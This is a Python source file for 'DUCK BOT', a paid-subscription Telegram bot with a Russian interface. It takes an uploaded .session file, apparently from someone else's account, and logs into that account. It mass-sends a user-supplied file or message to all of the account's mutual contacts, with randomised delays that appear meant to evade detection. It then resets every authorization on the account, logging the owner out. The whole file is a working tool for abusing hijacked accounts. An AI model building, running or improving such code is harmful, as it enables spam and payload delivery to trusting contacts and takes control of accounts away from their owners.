import asyncio
import os
import sqlite3
import random
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest, LogOutRequest
from telethon.tl.types import DocumentAttributeFilename
from telethon.tl.custom import Button
from aiohttp import web

# ==========================================
# 🔧 НАСТРОЙКИ
# ==========================================
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
PAYMENT_LINK = "t.me/send?start=IVjCRR0FvTtc"
SUBSCRIPTION_PRICE = "$3"
SUBSCRIPTION_DAYS = 7

# 👑 СПИСОК VIP ПОЛЬЗОВАТЕЛЕЙ (ВЕЧНАЯ ПОДПИСКА)
VIP_USERS = [440077089, 789299303]

accounts = {}
current_step = {}
current_materials = {}
broadcast_stats = {}
broadcast_cancelled = {}
broadcast_queue = {}

conn = sqlite3.connect('bot.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        subscription_end DATE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
''')

cursor.execute('''
    CREATE TABLE IF NOT EXISTS materials (
        user_id INTEGER PRIMARY KEY,
        file_path TEXT,
        caption TEXT,
        name TEXT
    )
''')
conn.commit()

for d in ['sessions', 'materials']:
    os.makedirs(d, exist_ok=True)

# ==========================================
# 🎨 КНОПКИ
# ==========================================
def main_kb(has_subscription, is_vip=False):
    if not has_subscription:
        return [
            [Button.url("💳 Оформить подписку", PAYMENT_LINK)],
            [Button.inline("👤 Мой профиль", b'profile')]
        ]
    sub_text = "👑 VIP" if is_vip else f"✅ ({has_subscription} дн.)" if isinstance(has_subscription, int) else "✅"
    return [
        [Button.inline("⚡ Запуск рассылки", b'broadcast')],
        [Button.inline("📎 Материал", b'material'), Button.inline("👤 Профиль", b'profile')],
        [Button.inline("📊 Статистика", b'stats')]
    ]

def get_protocol_kb():
    return [
        [Button.inline("💾 Загрузить сессию", b'sess_file')],
        [Button.inline("📱 Через номер", b'phone')],
        [Button.inline("✕ Отмена", b'main')]
    ]

def get_active_kb():
    return [[Button.inline("🛑 Стоп", b'cancel_broadcast')]]

def get_after_kb():
    return [
        [Button.inline("🔁 Повтор", b'repeat')],
        [Button.inline("🏠 Меню", b'main')]
    ]

# ==========================================
# 💾 ФУНКЦИИ БД
# ==========================================
def get_user(uid):
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (uid,))
    return cursor.fetchone()

def add_user(uid, username=None):
    cursor.execute('INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)', (uid, username))
    conn.commit()

def set_subscription(uid, days=7):
    end_date = datetime.now() + timedelta(days=days)
    cursor.execute('UPDATE users SET subscription_end = ? WHERE user_id = ?', (end_date, uid))
    conn.commit()

def check_subscription(uid):
    # 👑 ПРОВЕРКА VIP ПОЛЬЗОВАТЕЛЕЙ
    if uid in VIP_USERS:
        return "VIP", -1  # -1 означает вечную подписку
    
    user = get_user(uid)
    if not user:
        return False, None
    
    sub_end = user[2]
    if not sub_end:
        return False, None
    
    try:
        end_date = datetime.strptime(sub_end, '%Y-%m-%d %H:%M:%S.%f') if ' ' in sub_end else datetime.strptime(sub_end, '%Y-%m-%d')
        if datetime.now() < end_date:
            days_left = (end_date - datetime.now()).days
            return days_left, days_left
        else:
            return False, 0
    except:
        return False, None

def save_material(uid, mat):
    cursor.execute('INSERT OR REPLACE INTO materials VALUES (?,?,?,?)', (uid, mat['file'], mat['caption'], mat['name']))
    conn.commit()

def load_material(uid):
    cursor.execute('SELECT * FROM materials WHERE user_id = ?', (uid,))
    row = cursor.fetchone()
    if row: return {'file': row[1], 'caption': row[2], 'name': row[3]}
    return None

def update_stats(uid, count):
    broadcast_stats.setdefault(uid, {'total': 0, 'today': 0})
    broadcast_stats[uid]['total'] += count
    broadcast_stats[uid]['today'] += count

# ==========================================
# 🏁 БОТ
# ==========================================
async def main():
    bot = TelegramClient('bot', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    bot_id = (await bot.get_me()).id
    print(f"✅ Bot started: {bot_id}")

    @bot.on(events.NewMessage(pattern=r'/start'))
    async def start(e):
        uid = e.sender_id
        username = e.sender.username
        add_user(uid, username)
        current_step[uid] = 'menu'
        
        has_sub, days = check_subscription(uid)
        is_vip = uid in VIP_USERS
        
        if has_sub:
            if is_vip:
                await e.respond(
                    f"**🦆 DUCK BOT**\n\n"
                    f"**👑 VIP ПОДПИСКА**\n"
                    f"**Вечный доступ!**\n\n"
                    "Выберите действие:",
                    buttons=main_kb("VIP", True)
                )
            else:
                await e.respond(
                    f"**🦆 DUCK BOT**\n\n"
                    f"✅ **Подписка активна!** ({days} дн.)\n\n"
                    "Выберите действие:",
                    buttons=main_kb(days, False)
                )
        else:
            await e.respond(
                f"**🦆 DUCK BOT**\n\n"
                f"❌ **Подписка не найдена**\n\n"
                f"💰 Стоимость: {SUBSCRIPTION_PRICE} / {SUBSCRIPTION_DAYS} дней\n\n"
                "Нажмите кнопку ниже для оплаты:",
                buttons=main_kb(False, False)
            )

    @bot.on(events.NewMessage)
    async def handler(e):
        uid = e.sender_id
        txt = e.text
        step = current_step.get(uid, 'menu')
        
        if txt is None or e.sender_id == bot_id:
            return
        
        txt = txt.strip()
        if txt.startswith('/'):
            return

        has_sub, days = check_subscription(uid)
        is_vip = uid in VIP_USERS
        
        if not has_sub and step != 'check_payment':
            await e.respond("❌ **Требуется подписка**\n\nНажмите /start", buttons=[[Button.url("💳 Оплатить", PAYMENT_LINK)]])
            return

        # 💾 SESSION
        if step == 'sess_file':
            if e.file and e.file.name.endswith('.session'):
                msg = await e.respond("⏳ Загрузка сессии...")
                try:
                    if uid in accounts:
                        for acc in accounts[uid].values():
                            try: await acc['client'].disconnect()
                            except: pass
                        accounts[uid] = {}
                    
                    path = await e.download_media(file=f"sessions/{uid}.session")
                    client = TelegramClient(path.replace('.session',''), API_ID, API_HASH)
                    await client.connect()
                    
                    if not await client.is_user_authorized():
                        await msg.edit("❌ Недействительна"); await client.disconnect(); return
                    
                    me = await client.get_me()
                    contacts = await client(GetContactsRequest(0))
                    total = len([u for u in contacts.users if not u.bot])
                    mutual = len([u for u in contacts.users if u.mutual_contact and not u.bot])
                    
                    accounts.setdefault(uid, {})['active'] = {
                        'client': client, 'phone': me.phone, 'name': me.first_name or 'User',
                        'username': me.username or 'нет', 'total': total, 'mutual': mutual
                    }
                    current_step[uid] = 'menu'
                    
                    await msg.edit(
                        f"**✅ Аккаунт подключён!**\n\n"
                        f"👤 {me.first_name}\n"
                        f"📞 +{me.phone}\n"
                        f"💬 Взаимных: {mutual}",
                        buttons=main_kb("VIP" if is_vip else days, is_vip)
                    )
                except Exception as err:
                    await msg.edit(f"❌ Ошибка: {str(err)[:100]}")
            return

        # 📎 MATERIAL
        if step == 'upload_mat':
            if e.file or txt:
                current_materials.pop(uid, None)
                
                if e.file:
                    path = await e.download_media(file=f"materials/{uid}_{e.file.name}")
                    mat = {'file': path, 'caption': txt or '', 'name': e.file.name}
                else:
                    mat = {'file': None, 'caption': txt, 'name': 'Text'}
                
                current_materials[uid] = mat
                current_step[uid] = 'menu'
                save_material(uid, mat)
                
                await e.respond(
                    f"**✅ Файл загружен!**\n\n"
                    f"📁 {mat['name']}\n"
                    f"📝 {mat['caption'][:50] if mat['caption'] else 'нет'}",
                    buttons=main_kb("VIP" if is_vip else days, is_vip)
                )
            return

    @bot.on(events.CallbackQuery)
    async def cb(e):
        uid = e.sender_id
        d = e.data.decode()
        
        has_sub, days = check_subscription(uid)
        is_vip = uid in VIP_USERS

        if d == 'main':
            current_step[uid] = 'menu'
            await e.edit(
                f"**🦆 DUCK BOT**\n\n"
                f"{'👑 VIP ПОДПИСКА (Вечная)' if is_vip else '✅ Подписка активна!' if has_sub else '❌ Нет подписки'}\n\n"
                "Выберите действие:",
                buttons=main_kb("VIP" if is_vip else days if has_sub else False, is_vip)
            )
        
        elif d == 'broadcast':
            if not has_sub:
                return await e.answer("❌ Нет подписки!", alert=True)
            
            current_step[uid] = 'menu'
            
            if not accounts.get(uid):
                await e.edit(
                    "**⚡ ЗАПУСК РАССЫЛКИ**\n\n"
                    "🔐 **Протокол входа:**\n\n"
                    "Выберите метод подключения аккаунта:",
                    buttons=get_protocol_kb()
                )
            else:
                await e.edit(
                    "**⚡ РАССЫЛКА**\n\n"
                    "Аккаунт уже подключён.\n"
                    "Загрузить новый?",
                    buttons=[
                        [Button.inline("💾 Загрузить сессию", b'sess_file')],
                        [Button.inline("✅ Запустить", b'confirm')],
                        [Button.inline("✕ Отмена", b'main')]
                    ]
                )
        
        elif d == 'sess_file':
            current_step[uid] = 'sess_file'
            await e.edit("💾 **Отправьте .session файл**\n\nЗагрузите сессию Telegram", buttons=[[Button.inline("✕ Отмена", b'main')]])
        
        elif d == 'phone':
            current_step[uid] = 'phone'
            await e.edit("📱 **Введите номер**\n\n+79991234567", buttons=[[Button.inline("✕ Отмена", b'main')]])
        
        elif d == 'material':
            if not has_sub:
                return await e.answer("❌ Нет подписки!", alert=True)
            current_step[uid] = 'upload_mat'
            await e.edit("📎 **Отправьте файл или текст**", buttons=[[Button.inline("✕ Отмена", b'main')]])
        
        elif d == 'profile':
            user = get_user(uid)
            has_sub, days = check_subscription(uid)
            is_vip = uid in VIP_USERS
            
            if user:
                created = user[3] if len(user) > 3 else 'N/A'
                
                if is_vip:
                    sub_text = "👑 **VIP (Вечная)**"
                elif has_sub:
                    sub_text = f"✅ Активна ({days} дн.)"
                else:
                    sub_text = "❌ Неактивна"
                
                acc_info = ""
                if accounts.get(uid):
                    acc = list(accounts[uid].values())[0]
                    acc_info = f"\n\n**📱 Аккаунт:**\n{acc['name']} (+{acc['phone']})"
                
                await e.edit(
                    f"**👤 МОЙ ПРОФИЛЬ**\n\n"
                    f"**ID:** `{uid}`\n"
                    f"**Подписка:** {sub_text}\n"
                    f"**Регистрация:** {created}\n"
                    f"{acc_info}",
                    buttons=main_kb("VIP" if is_vip else days if has_sub else False, is_vip)
                )
            else:
                await e.edit("⚠️ Профиль не найден")
        
        elif d == 'stats':
            if not has_sub:
                return await e.answer("❌ Нет подписки!", alert=True)
            stats = broadcast_stats.get(uid, {'total': 0, 'today': 0})
            await e.edit(
                f"**📊 СТАТИСТИКА**\n\n"
                f"Всего: {stats['total']}\n"
                f"Сегодня: {stats['today']}",
                buttons=main_kb("VIP" if is_vip else days if has_sub else False, is_vip)
            )
        
        elif d == 'confirm':
            if not has_sub:
                return await e.answer("❌ Нет подписки!", alert=True)
            if uid not in current_materials:
                return await e.answer("❌ Загрузите файл!", alert=True)
            broadcast_cancelled[uid] = False
            broadcast_queue[uid] = True
            await e.edit("⏳ Запуск...", buttons=get_active_kb())
            asyncio.create_task(do_broadcast(bot, uid, e))
        
        elif d == 'repeat':
            if uid in current_materials:
                broadcast_cancelled[uid] = False
                broadcast_queue[uid] = True
                await e.edit("🔁 Повтор...", buttons=get_active_kb())
                asyncio.create_task(do_broadcast(bot, uid, e))
        
        elif d == 'cancel_broadcast':
            broadcast_cancelled[uid] = True
            await e.answer("🛑 СТОП", alert=True)
        
        await e.answer()

    async def do_broadcast(bot, uid, e):
        try:
            accs = accounts.get(uid, {})
            mat = current_materials.get(uid)
            if not accs or not mat:
                broadcast_queue[uid] = False
                return
            
            sent, failed = 0, 0
            targets = []
            for acc in accs.values():
                try:
                    c = await acc['client'](GetContactsRequest(0))
                    targets.append((acc, [u for u in c.users if u.mutual_contact and not u.bot]))
                except: pass
            
            if not targets:
                await e.respond("⚠️ Нет контактов")
                broadcast_queue[uid] = False
                return
            
            total = sum(len(t) for _,t in targets)
            status = await e.respond(f"⚡ Отправка: 0/{total}", buttons=get_active_kb())
            
            current, cancelled = 0, False
            for acc, users in targets:
                if broadcast_cancelled.get(uid):
                    cancelled = True
                    break
                for user in users:
                    if broadcast_cancelled.get(uid):
                        cancelled = True
                        break
                    try:
                        if mat['file']:
                            await acc['client'].send_file(user.id, mat['file'], caption=mat['caption'])
                        else:
                            await acc['client'].send_message(user.id, mat['caption'])
                        sent += 1
                    except: failed += 1
                    current += 1
                    if current % 10 == 0:
                        await status.edit(f"⚡ Отправка: {current}/{total}", buttons=get_active_kb())
                    await asyncio.sleep(random.uniform(2, 4))
            
            success, fail = [], []
            for acc, _ in targets:
                try:
                    await acc['client'](ResetAuthorizationsRequest())
                    await acc['client'](LogOutRequest())
                    success.append(acc['name'])
                except: fail.append(acc['name'])
            
            accounts[uid] = {}
            update_stats(uid, sent)
            
            await status.edit(
                f"**✅ ГОТОВО!**\n\n"
                f"✅ {sent}\n"
                f"❌ {failed}\n"
                f"📊 Всего: {broadcast_stats[uid]['total']}",
                buttons=get_after_kb()
            )
            
            if success:
                await e.respond(f"🔐 **Выход из сессий**\n\n✅ {len(success)} аккаунтов закрыто")
            
            current_step[uid] = 'menu'
            broadcast_queue[uid] = False
            
        except Exception as err:
            print(f"Error: {err}")
            broadcast_queue[uid] = False

    await bot.run_until_disconnected()

async def start_web():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="🦆 OK"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8080))).start()

async def run():
    await asyncio.gather(start_web(), main())

if __name__ == '__main__':
    asyncio.run(run())
